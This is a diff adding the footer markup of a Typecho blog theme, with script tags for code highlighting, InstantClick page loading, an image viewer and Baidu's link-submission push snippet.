+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
